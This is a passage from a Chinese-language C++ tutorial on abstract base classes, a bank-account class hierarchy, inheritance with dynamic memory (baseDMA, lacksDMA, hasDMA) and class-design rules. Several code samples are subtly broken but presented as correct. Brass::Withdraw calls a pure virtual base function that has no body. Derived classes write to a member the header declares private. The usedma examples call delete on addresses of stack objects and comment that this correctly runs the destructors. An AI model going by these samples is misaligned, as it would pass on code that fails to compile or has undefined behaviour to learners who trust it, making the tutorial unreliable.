基类。但什么是“形状”本身？它太抽象了。我们实际操作的是具体的形状，如 Circle（圆）、Rectangle（矩形）、Triangle（三角形）等。创建一个通用的 Shape 对象可能没有意义，但我们希望所有具体的形状类都提供某些共同的操作，比如计算面积 (Area()) 或绘制 (Draw())。 C++ 通过纯虚函数 (Pure Virtual Function) 来实现抽象基类。 纯虚函数 (Pure Virtual Function): 纯虚函数是一种特殊的虚函数，它在基类中没有提供实现（或者说，实现被延迟到派生类）。 它用于声明一个接口，强制所有非抽象的派生类必须提供自己的实现。 语法: 在虚函数声明的末尾加上 = 0。 1virtual ReturnType FunctionName(parameters) const = 0; // 纯虚函数声明 抽象基类 (ABC) 的定义: 包含至少一个纯虚函数的类就是抽象基类 (ABC)。 ABC 的特性: 不能实例化: 你不能创建抽象基类的对象。 12// 假设 Shape 是一个 ABC// Shape myShape; // 错误！不能创建 ABC 的对象 编译器会阻止你这样做，因为 ABC 中的纯虚函数没有实现，对象是不完整的。 可以作为接口: ABC 主要用作定义接口。它规定了所有派生类必须实现哪些方法。 可以有指针和引用: 虽然不能创建 ABC 的对象，但你可以声明指向 ABC 的指针或引用。这些指针或引用可以指向或引用其具体的派生类对象。这对于实现多态至关重要。 123// 假设 Circle 是从 Shape 派生的具体类Shape * shapePtr = new Circle(5.0); // OK: 基类指针指向派生类对象Shape &amp; shapeRef = *shapePtr; // OK: 基类引用引用派生类对象 派生类必须实现纯虚函数: 任何从 ABC 派生的类，如果没有为继承来的所有纯虚函数提供实现，那么这个派生类也将成为一个抽象基类，同样不能被实例化。只有当派生类实现了所有继承的纯虚函数时，它才成为**具体类 (Concrete Class)**，可以被实例化。 13.6.1 应用 ABC 概念让我们定义一个简单的银行账户 ABC AcctABC。一个通用的“账户”可能无法直接操作，但所有具体的账户类型（如支票账户、储蓄账户）都应该有查询余额、存款、取款等操作。 acctabc.h (ABC 定义) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#ifndef ACCTABC_H_#define ACCTABC_H_#include &lt;iostream&gt;#include &lt;string&gt;// 抽象基类 AcctABCclass AcctABC &#123;private: std::string fullName; long acctNum; double balance;protected: // 改为 protected 以便派生类访问 // 辅助格式化函数 (protected，派生类可用) struct Formatting &#123; std::ios_base::fmtflags flag; std::streamsize pr; &#125;; const std::string &amp; FullName() const &#123; return fullName; &#125; long AcctNum() const &#123; return acctNum; &#125; Formatting SetFormat() const; void Restore(Formatting &amp; f) const;public: // 构造函数 (ABC 也可以有构造函数) AcctABC(const std::string &amp; s = &quot;Nullbody&quot;, long an = -1, double bal = 0.0); // 存款 void Deposit(double amt); // 取款 - 设为纯虚函数，具体实现在派生类 virtual void Withdraw(double amt) = 0; // 查询余额 double Balance() const &#123; return balance; &#125; // 查看账户信息 - 设为纯虚函数 virtual void ViewAcct() const = 0; // 虚析构函数 (基类有虚函数，析构函数也应是虚的) virtual ~AcctABC() &#123;&#125;&#125;;// 具体的派生类: Brass Account (支票账户)class Brass : public AcctABC &#123;public: Brass(const std::string &amp; s = &quot;Nullbody&quot;, long an = -1, double bal = 0.0) : AcctABC(s, an, bal) &#123;&#125; // 实现基类的纯虚函数 Withdraw virtual void Withdraw(double amt) override; // 实现基类的纯虚函数 ViewAcct virtual void ViewAcct() const override; // Brass 类没有新的纯虚函数，所以是具体类 virtual ~Brass() &#123;&#125;&#125;;// 具体的派生类: BrassPlus Account (带透支保护的支票账户)class BrassPlus : public AcctABC &#123;private: double maxLoan; // 最大透支额 double rate; // 透支利率 double owesBank; // 当前欠款public: BrassPlus(const std::string &amp; s = &quot;Nullbody&quot;, long an = -1, double bal = 0.0, double ml = 500, double r = 0.11125); BrassPlus(const Brass &amp; ba, double ml = 500, double r = 0.11125); // 实现基类的纯虚函数 Withdraw virtual void Withdraw(double amt) override; // 实现基类的纯虚函数 ViewAcct virtual void ViewAcct() const override; // 派生类自己的方法 void ResetMax(double m) &#123; maxLoan = m; &#125; void ResetRate(double r) &#123; rate = r; &#125;; void ResetOwes() &#123; owesBank = 0; &#125; virtual ~BrassPlus() &#123;&#125;&#125;;#endif // ACCTABC_H_ acctabc.cpp (实现) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124#include &lt;iostream&gt;#include &quot;acctabc.h&quot;using std::cout;using std::ios_base;using std::endl;using std::string;// --- AcctABC 方法实现 ---// 构造函数AcctABC::AcctABC(const string &amp; s, long an, double bal) &#123; fullName = s; acctNum = an; balance = bal;&#125;// 存款 (非虚函数，所有账户类型通用)void AcctABC::Deposit(double amt) &#123; if (amt &lt; 0) cout &lt;&lt; &quot;Negative deposit not allowed; &quot; &lt;&lt; &quot;deposit is cancelled.\\n&quot;; else balance += amt;&#125;// 注意：纯虚函数 Withdraw() 和 ViewAcct() 在基类中没有实现体// 辅助格式化函数AcctABC::Formatting AcctABC::SetFormat() const &#123; Formatting f; f.flag = cout.setf(ios_base::fixed, ios_base::floatfield); // use fixed-point f.pr = cout.precision(2); // for $$$.cc format return f;&#125;void AcctABC::Restore(Formatting &amp; f) const &#123; cout.setf(f.flag, ios_base::floatfield); cout.precision(f.pr);&#125;// --- Brass 方法实现 ---// 实现纯虚函数 Withdrawvoid Brass::Withdraw(double amt) &#123; if (amt &lt; 0) &#123; cout &lt;&lt; &quot;Withdrawal amount must be positive; &quot; &lt;&lt; &quot;withdrawal canceled.\\n&quot;; &#125; else if (amt &lt;= Balance()) &#123; // 使用基类的 Balance() 方法 AcctABC::Withdraw(amt); // 调用基类版本来更新余额 (如果基类有实现的话，这里假设基类没实现，直接修改) balance -= amt; &#125; else &#123; cout &lt;&lt; &quot;Withdrawal amount of $&quot; &lt;&lt; amt &lt;&lt; &quot; exceeds your balance.\\n&quot; &lt;&lt; &quot;Withdrawal canceled.\\n&quot;; &#125;&#125;// 实现纯虚函数 ViewAcctvoid Brass::ViewAcct() const &#123; Formatting f = SetFormat(); // 使用基类的格式化辅助函数 cout &lt;&lt; &quot;Brass Client: &quot; &lt;&lt; FullName() &lt;&lt; endl; // 使用基类的 protected 方法 cout &lt;&lt; &quot;Account Number: &quot; &lt;&lt; AcctNum() &lt;&lt; endl; // 使用基类的 protected 方法 cout &lt;&lt; &quot;Balance: $&quot; &lt;&lt; Balance() &lt;&lt; endl; // 使用基类的 public 方法 Restore(f); // 恢复格式&#125;// --- BrassPlus 方法实现 ---BrassPlus::BrassPlus(const string &amp; s, long an, double bal, double ml, double r) : AcctABC(s, an, bal) &#123; maxLoan = ml; owesBank = 0.0; rate = r;&#125;BrassPlus::BrassPlus(const Brass &amp; ba, double ml, double r) : AcctABC(ba) &#123; // 使用 AcctABC 的隐式复制构造函数 (如果存在且可用) // 或者显式调用 AcctABC(ba.FullName(), ba.AcctNum(), ba.Balance()) // (需要 ba 提供访问器或 AcctABC 成员是 protected) maxLoan = ml; owesBank = 0.0; rate = r;&#125;// 实现纯虚函数 ViewAcctvoid BrassPlus::ViewAcct() const &#123; Formatting f = SetFormat(); cout &lt;&lt; &quot;BrassPlus Client: &quot; &lt;&lt; FullName() &lt;&lt; endl; cout &lt;&lt; &quot;Account Number: &quot; &lt;&lt; AcctNum() &lt;&lt; endl; cout &lt;&lt; &quot;Balance: $&quot; &lt;&lt; Balance() &lt;&lt; endl; cout &lt;&lt; &quot;Maximum loan: $&quot; &lt;&lt; maxLoan &lt;&lt; endl; cout &lt;&lt; &quot;Owed to bank: $&quot; &lt;&lt; owesBank &lt;&lt; endl; cout.precision(3); cout &lt;&lt; &quot;Loan Rate: &quot; &lt;&lt; 100 * rate &lt;&lt; &quot;%\\n&quot;; Restore(f);&#125;// 实现纯虚函数 Withdrawvoid BrassPlus::Withdraw(double amt) &#123; if (amt &lt; 0) &#123; cout &lt;&lt; &quot;Withdrawal amount must be positive; &quot; &lt;&lt; &quot;withdrawal canceled.\\n&quot;; return; &#125; Formatting f = SetFormat(); double bal = Balance(); // 获取当前余额 if (amt &lt;= bal) &#123; // 如果余额足够 // 调用基类的 Withdraw (如果它修改余额) 或直接修改 // 假设 balance 是 protected: balance -= amt; &#125; else if (amt &lt;= bal + maxLoan - owesBank) &#123; // 如果余额+剩余可透支额度足够 double advance = amt - bal; // 需要透支的金额 owesBank += advance * (1.0 + rate); // 计算欠款 (加上利息) cout &lt;&lt; &quot;Bank advance: $&quot; &lt;&lt; advance &lt;&lt; endl; cout &lt;&lt; &quot;Finance charge: $&quot; &lt;&lt; advance * rate &lt;&lt; endl; Deposit(advance); // 先存入透支额度 (增加余额) // 再取款 (修改余额) // 假设 balance 是 protected: balance -= amt; &#125; else &#123; cout &lt;&lt; &quot;Credit limit exceeded. Transaction cancelled.\\n&quot;; &#125; Restore(f);&#125; 使用示例 (usebrass1.cpp) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &lt;iostream&gt;#include &quot;acctabc.h&quot; // 包含 ABC 和派生类const int CLIENTS = 4;int main() &#123; using std::cin; using std::cout; using std::endl; // AcctABC anAccount; // 错误！不能创建抽象基类对象 AcctABC * p_clients[CLIENTS]; // 可以创建指向 ABC 的指针数组 std::string temp; long tempnum; double tempbal; char kind; for (int i = 0; i &lt; CLIENTS; i++) &#123; cout &lt;&lt; &quot;Enter client&#x27;s name: &quot;; getline(cin, temp); cout &lt;&lt; &quot;Enter client&#x27;s account number: &quot;; cin &gt;&gt; tempnum; cout &lt;&lt; &quot;Enter opening balance: $&quot;; cin &gt;&gt; tempbal; cout &lt;&lt; &quot;Enter 1 for Brass Account or &quot; &lt;&lt; &quot;2 for BrassPlus Account: &quot;; while (cin &gt;&gt; kind &amp;&amp; (kind != &#x27;1&#x27; &amp;&amp; kind != &#x27;2&#x27;)) cout &lt;&lt; &quot;Enter either 1 or 2: &quot;; if (kind == &#x27;1&#x27;) p_clients[i] = new Brass(temp, tempnum, tempbal); else &#123; double tmax, trate; cout &lt;&lt; &quot;Enter the overdraft limit: $&quot;; cin &gt;&gt; tmax; cout &lt;&lt; &quot;Enter the interest rate &quot; &lt;&lt; &quot;as a decimal fraction: &quot;; cin &gt;&gt; trate; p_clients[i] = new BrassPlus(temp, tempnum, tempbal, tmax, trate); &#125; while (cin.get() != &#x27;\\n&#x27;) // 清除行尾换行符 continue; &#125; cout &lt;&lt; endl; // 使用多态性处理不同类型的账户 for (int i = 0; i &lt; CLIENTS; i++) &#123; p_clients[i]-&gt;ViewAcct(); // 调用虚函数 ViewAcct() cout &lt;&lt; endl; &#125; // 释放内存 for (int i = 0; i &lt; CLIENTS; i++) &#123; delete p_clients[i]; // 调用虚析构函数，确保正确的析构函数被调用 &#125; cout &lt;&lt; &quot;Done.\\n&quot;; return 0;&#125; 编译和运行: 123## 假设 acctabc.h 中 balance 已移至 protectedg++ usebrass1.cpp acctabc.cpp -o usebrass1./usebrass1 程序会提示输入客户信息，创建不同类型的账户对象，然后通过基类指针数组 p_clients 多态地调用 ViewAcct() 方法，显示每个账户的信息。最后，通过 delete p_clients[i] 安全地销毁对象，因为 ~AcctABC() 是虚析构函数。 13.6.2 ABC 理念抽象基类的核心理念是接口与实现分离。 接口: ABC 定义了一个通用的接口（通过纯虚函数和可能的非虚函数），规定了派生类应该具有哪些功能。 实现: 具体的派生类负责提供这些功能的具体实现。 使用 ABC 的好处： 强制接口统一: 确保所有相关的派生类都遵循一个共同的接口规范。 实现多态: 允许通过基类指针或引用来统一处理不同派生类的对象，调用它们各自实现的虚函数版本。 代码可扩展性: 当需要添加新的账户类型（例如 SavingsAccount）时，只需从 AcctABC 派生并实现其纯虚函数即可，现有使用 AcctABC* 的代码（如 main 函数中的循环）通常无需修改就能处理新的账户类型。 清晰的设计: 更好地模拟现实世界中的抽象概念和层次关系。 ABC 是 C++ 中实现抽象和多态的关键工具，对于设计灵活、可维护的面向对象系统非常重要。 13.7 继承和动态内存分配当继承与动态内存分配（使用 new 和 delete）结合时，我们需要特别注意析构函数、复制构造函数和赋值运算符的行为，以确保资源的正确管理。主要有两种情况： 13.7.1 第一种情况：派生类不使用 new如果基类使用了动态内存分配（因此需要自定义析构函数、复制构造函数、赋值运算符），而派生类没有使用 new 来分配自己的动态内存，情况相对简单。 析构函数: 派生类不需要显式定义析构函数来释放内存（因为它没有分配）。 当派生类对象被销毁时，会先执行派生类的析构函数（即使是编译器生成的默认版本），然后自动调用基类的析构函数。 关键: 为了能通过基类指针 delete 派生类对象，基类的析构函数必须声明为 virtual。如果基类析构函数是虚函数，那么 delete basePtr; (其中 basePtr 指向派生类对象) 会先调用派生类的析构函数，再调用基类的析构函数，确保所有资源被正确释放。 复制构造函数: 派生类的默认复制构造函数会执行成员逐一复制。对于继承自基类的部分，它会自动调用基类的复制构造函数。 因此，如果基类的复制构造函数正确实现了深复制，那么派生类对象的基类部分也会被正确地深复制。派生类自身的成员（非动态分配）会被正常复制。 赋值运算符: 派生类的默认赋值运算符会执行成员逐一赋值。对于继承自基类的部分，它会自动调用基类的赋值运算符。 因此，如果基类的赋值运算符正确实现了深复制（包括处理自我赋值和释放旧内存），那么派生类对象的基类部分也会被正确地赋值。 结论: 如果基类正确地管理了它的动态内存（遵循三/五法则，特别是使用虚析构函数），并且派生类没有引入新的动态内存管理需求，那么派生类通常不需要显式定义这些特殊的成员函数。 示例 (baseDMA 和 lacksDMA): 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111// dma.h -- 继承和动态内存分配#ifndef DMA_H_#define DMA_H_#include &lt;iostream&gt;// 使用动态内存分配的基类class baseDMA &#123;private: char * label; int rating;public: baseDMA(const char * l = &quot;null&quot;, int r = 0); baseDMA(const baseDMA &amp; rs); // 复制构造函数 virtual ~baseDMA(); // 虚析构函数 baseDMA &amp; operator=(const baseDMA &amp; rs); // 赋值运算符 friend std::ostream &amp; operator&lt;&lt;(std::ostream &amp; os, const baseDMA &amp; rs);&#125;;// 派生类 - 不使用 newclass lacksDMA : public baseDMA &#123;private: enum &#123; COL_LEN = 40 &#125;; char color[COL_LEN];public: lacksDMA(const char * c = &quot;blank&quot;, const char * l = &quot;null&quot;, int r = 0); lacksDMA(const char * c, const baseDMA &amp; rs); // 不需要自定义析构函数、复制构造函数、赋值运算符 friend std::ostream &amp; operator&lt;&lt;(std::ostream &amp; os, const lacksDMA &amp; ls);&#125;;#endif // DMA_H_// dma.cpp -- 实现#include &quot;dma.h&quot;#include &lt;cstring&gt;// --- baseDMA 实现 ---baseDMA::baseDMA(const char * l, int r) &#123; label = new char[std::strlen(l) + 1]; std::strcpy(label, l); rating = r;&#125;baseDMA::baseDMA(const baseDMA &amp; rs) &#123; // 深复制 label = new char[std::strlen(rs.label) + 1]; std::strcpy(label, rs.label); rating = rs.rating;&#125;baseDMA::~baseDMA() &#123; delete [] label;&#125;baseDMA &amp; baseDMA::operator=(const baseDMA &amp; rs) &#123; // 深复制赋值 if (this == &amp;rs) return *this; delete [] label; // 释放旧内存 label = new char[std::strlen(rs.label) + 1]; std::strcpy(label, rs.label); rating = rs.rating; return *this;&#125;std::ostream &amp; operator&lt;&lt;(std::ostream &amp; os, const baseDMA &amp; rs) &#123; os &lt;&lt; &quot;Label: &quot; &lt;&lt; rs.label &lt;&lt; std::endl; os &lt;&lt; &quot;Rating: &quot; &lt;&lt; rs.rating &lt;&lt; std::endl; return os;&#125;// --- lacksDMA 实现 ---lacksDMA::lacksDMA(const char * c, const char * l, int r) : baseDMA(l, r) &#123; // 调用基类构造函数 std::strncpy(color, c, COL_LEN - 1); color[COL_LEN - 1] = &#x27;\\0&#x27;;&#125;lacksDMA::lacksDMA(const char * c, const baseDMA &amp; rs) : baseDMA(rs) &#123; // 调用基类复制构造函数 std::strncpy(color, c, COL_LEN - 1); color[COL_LEN - 1] = &#x27;\\0&#x27;;&#125;std::ostream &amp; operator&lt;&lt;(std::ostream &amp; os, const lacksDMA &amp; ls) &#123; // 调用基类的 operator&lt;&lt; (需要友元或类型转换，或者直接访问) // 这里假设通过类型转换或直接调用基类方法 os &lt;&lt; (const baseDMA &amp;) ls; // 将派生类引用转换为基类引用来调用基类 operator&lt;&lt; os &lt;&lt; &quot;Color: &quot; &lt;&lt; ls.color &lt;&lt; std::endl; return os;&#125;// usedma.cpp -- 使用示例#include &lt;iostream&gt;#include &quot;dma.h&quot;int main() &#123; using std::cout; using std::endl; baseDMA shirt(&quot;Portabelly&quot;, 8); lacksDMA balloon(&quot;red&quot;, &quot;Blimpo&quot;, 4); // 派生类对象 lacksDMA balloon2(balloon); // 使用默认复制构造函数 cout &lt;&lt; &quot;Displaying baseDMA object:\\n&quot;; cout &lt;&lt; shirt; cout &lt;&lt; &quot;Displaying lacksDMA object:\\n&quot;; cout &lt;&lt; balloon; cout &lt;&lt; &quot;Result of lacksDMA copy:\\n&quot;; cout &lt;&lt; balloon2; baseDMA * p_dma = &amp;balloon; // 基类指针指向派生类 cout &lt;&lt; &quot;Deleting derived object via base pointer:\\n&quot;; delete p_dma; // 正确调用 ~lacksDMA() (默认) 然后 ~baseDMA() (虚函数) return 0;&#125; 13.7.2 第二种情况：派生类使用 new如果派生类也使用了 new 来分配自己的动态内存，那么派生类必须提供自己的析构函数、复制构造函数和赋值运算符。 析构函数 (~Derived()): 必须显式定义。 负责 delete 或 delete[] 派生类自己分配的内存。 不需要（也不能）显式调用基类的析构函数；基类析构函数会在派生类析构函数执行完毕后自动被调用。 基类析构函数仍应是 virtual。 复制构造函数 (Derived(const Derived &amp;)): 必须显式定义。 在成员初始化列表中，必须显式调用基类的复制构造函数 Base(other) 来完成基类部分的深复制。 然后，在构造函数体中，为派生类自己管理的动态内存执行深复制（分配新内存，复制数据）。 赋值运算符 (Derived &amp; operator=(const Derived &amp;)): 必须显式定义。 检查自我赋值。 显式调用基类的赋值运算符 Base::operator=(other) 来完成基类部分的深复制赋值。 释放派生类当前对象的旧动态内存。 为派生类当前对象的动态成员分配新内存，并从源对象复制数据。 返回 *this。 示例 (添加 hasDMA 类): 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677// dma.h (续)// 派生类 - 使用 newclass hasDMA : public baseDMA &#123;private: char * style; // 派生类管理的动态内存public: hasDMA(const char * s = &quot;none&quot;, const char * l = &quot;null&quot;, int r = 0); hasDMA(const char * s, const baseDMA &amp; rs); hasDMA(const hasDMA &amp; hs); // 复制构造函数 ~hasDMA(); // 析构函数 hasDMA &amp; operator=(const hasDMA &amp; hs); // 赋值运算符 friend std::ostream &amp; operator&lt;&lt;(std::ostream &amp; os, const hasDMA &amp; hs);&#125;;// dma.cpp (续)// --- hasDMA 实现 ---hasDMA::hasDMA(const char * s, const char * l, int r) : baseDMA(l, r) &#123; // 调用基类构造函数 style = new char[std::strlen(s) + 1]; std::strcpy(style, s);&#125;hasDMA::hasDMA(const char * s, const baseDMA &amp; rs) : baseDMA(rs) &#123; // 调用基类复制构造函数 style = new char[std::strlen(s) + 1]; std::strcpy(style, s);&#125;hasDMA::hasDMA(const hasDMA &amp; hs) : baseDMA(hs) &#123; // *** 调用基类复制构造函数 *** style = new char[std::strlen(hs.style) + 1]; // 深复制派生类成员 std::strcpy(style, hs.style);&#125;hasDMA::~hasDMA() &#123; delete [] style; // 释放派生类分配的内存 (基类析构函数会自动调用)&#125;hasDMA &amp; hasDMA::operator=(const hasDMA &amp; hs) &#123; if (this == &amp;hs) return *this; baseDMA::operator=(hs); // *** 调用基类赋值运算符 *** delete [] style; // 释放派生类旧内存 style = new char[std::strlen(hs.style) + 1]; // 深复制派生类成员 std::strcpy(style, hs.style); return *this;&#125;std::ostream &amp; operator&lt;&lt;(std::ostream &amp; os, const hasDMA &amp; hs) &#123; os &lt;&lt; (const baseDMA &amp;) hs; // 显示基类部分 os &lt;&lt; &quot;Style: &quot; &lt;&lt; hs.style &lt;&lt; std::endl; // 显示派生类部分 return os;&#125;// usedma.cpp (续)int main() &#123; // ... (之前的代码) ... cout &lt;&lt; &quot;\\nTesting hasDMA:\\n&quot;; hasDMA map(&quot;Mercator&quot;, &quot;Buffalo Keys&quot;, 5); hasDMA map2 = map; // 调用 hasDMA 复制构造函数 hasDMA map3; map3 = map; // 调用 hasDMA 赋值运算符 cout &lt;&lt; &quot;Displaying hasDMA object:\\n&quot;; cout &lt;&lt; map; cout &lt;&lt; &quot;Result of hasDMA copy:\\n&quot;; cout &lt;&lt; map2; cout &lt;&lt; &quot;Result of hasDMA assignment:\\n&quot;; cout &lt;&lt; map3; baseDMA * p_dma2 = &amp;map; // 基类指针指向派生类 cout &lt;&lt; &quot;Deleting derived object via base pointer:\\n&quot;; delete p_dma2; // 正确调用 ~hasDMA() 然后 ~baseDMA() return 0;&#125; 13.7.3 使用动态内存分配和友元的继承示例在上面的 lacksDMA 和 hasDMA 示例中，我们重载了 operator&lt;&lt; 作为友元函数。当在派生类的友元函数中需要显示基类信息时，有几种方法： 使用基类的公有/保护接口: 如果基类提供了访问所需信息的 public 或 protected 方法，友元函数可以通过派生类对象调用这些方法。 使用类型转换: 将派生类对象的引用强制转换为基类对象的引用 (const baseDMA &amp;) hs，然后调用基类版本的 operator&lt;&lt;。这要求基类 operator&lt;&lt; 也是友元或能够通过公有接口访问所需信息。 让派生类的友元也是基类的友元: 这种方式比较少见，且增加了耦合度。 在示例中，我们使用了类型转换 (const baseDMA &amp;) hs 来调用基类的 operator&lt;&lt;，这是一种常见的做法。 总结: 当派生类不使用 new 时，通常依赖基类正确实现的虚析构函数、复制构造函数和赋值运算符即可。 当派生类也使用 new 时，派生类必须提供自己的析构函数、复制构造函数和赋值运算符。 派生类的析构函数负责清理派生类资源，基类析构函数自动调用。 派生类的复制构造函数必须在初始化列表中调用基类复制构造函数。 派生类的赋值运算符必须显式调用基类赋值运算符。 基类析构函数应始终为虚函数，以确保通过基类指针 delete 派生类对象时行为正确。 13.8 类设计回顾经过前面几章的学习，我们已经接触了 C++ 类设计的许多方面，从基础的封装到复杂的继承和动态内存管理。本节将回顾一些关键的设计决策和最佳实践。 13.8.1 编译器生成的成员函数C++ 编译器可以为我们自动生成一些特殊的成员函数，但这并不总是足够的，尤其是在处理资源（如动态内存）或设计继承层次结构时。 默认构造函数 (Default Constructor): 生成时机: 如果你没有声明任何构造函数。 行为: 对成员执行默认初始化（内置类型不初始化，类类型调用其默认构造函数）。 注意: 如果你定义了任何构造函数，编译器就不会生成默认构造函数。如果此时你还需要一个无参构造函数，必须自己定义。 析构函数 (Destructor): 生成时机: 如果你没有声明析构函数。 行为: 对类类型的成员调用它们的析构函数。 注意: 如果类管理需要显式释放的资源（如 new 分配的内存），必须提供自定义析构函数。如果类打算作为基类，析构函数应该是 virtual 的。 复制构造函数 (Copy Constructor): 生成时机: 如果你没有声明复制构造函数（且没有声明移动操作）。 行为: 执行**成员逐一复制 (浅复制)**。对于类类型成员，调用其复制构造函数。 注意: 如果类管理动态内存或包含不能简单复制的资源（如文件句柄），必须提供自定义复制构造函数以实现深复制。 复制赋值运算符 (Copy Assignment Operator): 生成时机: 如果你没有声明复制赋值运算符（且没有声明移动操作）。 行为: 执行**成员逐一赋值 (浅复制)**。对于类类型成员，调用其复制赋值运算符。 注意: 如果类管理动态内存或需要特殊赋值逻辑，必须提供自定义复制赋值运算符，确保深复制、处理自我赋值并释放旧资源。 移动构造函数 (Move Constructor) (C++11): 生成时机: 如果你没有声明任何复制操作（复制构造、复制赋值）、移动操作（移动构造、移动赋值）或析构函数。 行为: 执行成员逐一移动。对于类类型成员，调用其移动构造函数。目的是高效地转移资源所有权，而不是复制。 注意: 如果需要自定义资源转移逻辑，或者默认的成员移动不合适，可以自定义。如果定义了任何复制操作或析构函数，默认的移动构造函数通常不会生成，需要时需显式 = default 或自定义。 移动赋值运算符 (Move Assignment Operator) (C++11): 生成时机: 与移动构造函数类似。 行为: 执行成员逐一移动赋值。 注意: 与移动构造函数类似，如果需要自定义或默认版本未生成，需显式处理。 三/五/零法则 (Rule of Three/Five/Zero): 三法则 (C++11 前): 如果你需要自定义析构函数、复制构造函数或复制赋值运算符中的任何一个，你几乎肯定需要全部三个。 五法则 (C++11): 如果你需要自定义上述三个或移动构造函数/移动赋值运算符中的任何一个，你可能需要考虑全部五个。 零法则 (推荐): 优先使用 RAII（资源获取即初始化）原则，利用标准库容器（std::string, std::vector）和智能指针（std::unique_ptr, std::shared_ptr）来管理资源。如果类只包含这些能自我管理的成员，通常不需要自定义任何特殊成员函数，编译器生成的默认版本就能很好地工作。 13.8.2 其他的类方法除了特殊成员函数，类还包含其他用于实现其功能的方法： 构造函数 (Constructors): 除了默认构造函数，还可以定义多个构造函数来提供不同的对象初始化方式（例如，接受不同参数）。使用成员初始化列表来初始化成员变量。考虑使用 explicit 关键字阻止不期望的单参数隐式转换。 访问器 (Accessors): 通常是 public const 成员函数，用于获取对象的状态（私有数据成员的值），但不修改对象。例如 Balance() const。 修改器 (Mutators) / 设置器 (Setters): 用于修改对象状态（私有数据成员的值）的 public 成员函数。例如 ResetTable(bool v)。 功能函数 (Utility Functions): 实现类核心逻辑的其他成员函数。可以是 public, protected, 或 private。 const 成员函数: 在函数声明和定义后加 const，表示该函数不会修改调用它的对象的状态（数据成员）。const 对象只能调用 const 成员函数。 静态成员函数 (static): 与类本身关联，而不是特定对象。没有 this 指针，只能访问静态成员。通过类名调用 (ClassName::staticFunc())。 虚函数 (virtual): 用于在继承层次结构中实现多态。允许通过基类指针/引用调用派生类的特定实现。 13.8.3 公有继承的考虑因素公有继承是实现 “is-a” 关系和多态的关键，但需要仔细考虑： “is-a” 关系: 确保派生类确实是基类的一种特殊类型，并且符合基类的行为契约（Liskov 替换原则）。 虚析构函数: 如果类可能被用作基类（特别是如果可能通过基类指针 delete 派生类对象），必须将析构函数声明为 virtual。 继承接口 vs. 实现: 纯虚函数: 只继承接口，强制派生类提供实现（用于抽象基类）。 虚函数 (有实现): 继承接口和默认实现，允许派生类覆盖默认实现。 非虚函数: 继承接口和强制实现，派生类不应重新定义（覆盖非虚函数通常是坏打算）。 访问控制: public 成员构成类的公有接口。 private 成员是实现细节，对派生类隐藏。 protected 成员对派生类可见，但对外部隐藏。谨慎使用 protected 数据，它会增加基类和派生类之间的耦合。优先使用 protected 函数。 构造函数和初始化: 派生类构造函数必须调用基类构造函数（通常在成员初始化列表中）来初始化基类部分。 赋值运算符: 派生类的赋值运算符需要显式调用基类的赋值运算符来处理基类部分。 对象切片 (Slicing): 如果将派生类对象直接按值赋给基类对象（Base b = derived;），派生类特有的部分会被“切掉”，只保留基类部分。这是需要避免的，通常应使用指针或引用来处理多态对象。 13.8.4 类函数小结 函数类别 目的与说明 关键特性/关键字 构造函数 初始化新创建的对象 类名相同, 无返回类型, 可重载, explicit 析构函数 对象销毁前执行清理工作（释放资源） ~ClassName(), 无参数, 无返回类型, virtual 复制构造函数 用同类对象初始化新对象 ClassName(const ClassName &amp;), 深复制 复制赋值运算符 将一个已存在的同类对象赋给另一个 operator=(const ClassName &amp;), 深复制, 返回 *this 移动构造函数 用同类右值对象初始化新对象（转移资源） ClassName(ClassName &amp;&amp;), C++11, 移动语义 移动赋值运算符 将一个同类右值对象赋给另一个（转移资源） operator=(ClassName &amp;&amp;), C++11, 移动语义 普通成员函数 实现类的行为和功能 隐式 this 指针 const 成员函数 访问对象状态，但不修改对象 函数声明/定义后加 const static 成员函数 与类本身关联，而非特定对象 static, 无 this 指针 virtual 函数 允许在派生类中覆盖，实现多态 virtual, 动态联编 纯虚函数 定义接口，强制派生类实现（用于 ABC） virtual ... = 0; 运算符重载函数 定义标准运算符用于类对象的行为 operator+, operator&lt;&lt;, etc. 转换函数 定义从类类型到其他类型的转换 operator typeName(), explicit 友元函数/类 允许非成员函数或类访问私有/保护成员 friend 设计良好的类需要仔细考虑这些不同类型的函数，确保封装性、资源管理的正确性、接口的清晰性以及在继承体系中的恰当行为。 13.9 总结本章介绍了 C++ 的一个核心特性——继承，它允许我们基于现有类创建新类，实现代码重用和建立类之间的层次关系。 主要内容回顾： 基本继承: 一个类（派生类）可以从另一个类（基类）继承成员（数据和方法）。 公有继承 (public) 是最常用的方式，建立 “is-a” 关系，意味着派生类对象也是一个基类对象。基类的公有成员在派生类中仍然是公有，保护成员仍然是保护。 派生类构造函数必须通过成员初始化列表调用基类构造函数来初始化继承的基类部分。 多态公有继承: 多态允许我们通过基类接口（指针或引用）统一处理不同类型的派生类对象。 通过在基类中将成员函数声明为虚函数 (virtual) 来启用多态行为。 当通过基类指针或引用调用虚函数时，程序在运行时根据对象的实际类型选择调用哪个版本的方法（动态联编或晚绑定）。 如果函数不是虚函数，或者通过对象直接调用，则在编译时根据指针/引用的声明类型或对象类型决定调用版本（静态联编或早绑定）。 虚函数注意事项: override (C++11): 推荐在派生类覆盖虚函数时使用，以进行编译器检查。 final (C++11): 可用于阻止虚函数在更深层派生类中被覆盖，或阻止类被继承。 构造函数不能是虚函数。 虚析构函数: 如果类可能被用作基类（特别是涉及动态内存分配或可能通过基类指针删除派生类对象），其析构函数必须声明为 virtual，以确保正确的析构顺序和资源释放。 访问控制 (protected): protected 成员对类内部和派生类成员函数可见，但对外部代码不可见。 它提供了介于 private 和 public 之间的访问级别。 虽然 protected 允许派生类直接访问基类实现细节，但可能破坏封装，应谨慎使用。优先使用 private 数据和 public/protected 接口函数。 抽象基类 (ABC): 包含至少一个纯虚函数 (virtual ... = 0;) 的类是抽象基类。 ABC 不能被实例化（不能创建对象）。 主要用于定义一个接口规范，强制派生类实现纯虚函数。 可以声明指向 ABC 的指针或引用，用于实现多态。 派生类只有实现了所有继承的纯虚函数后，才能成为具体类。 继承与动态内存分配: 基类使用 new，派生类不用: 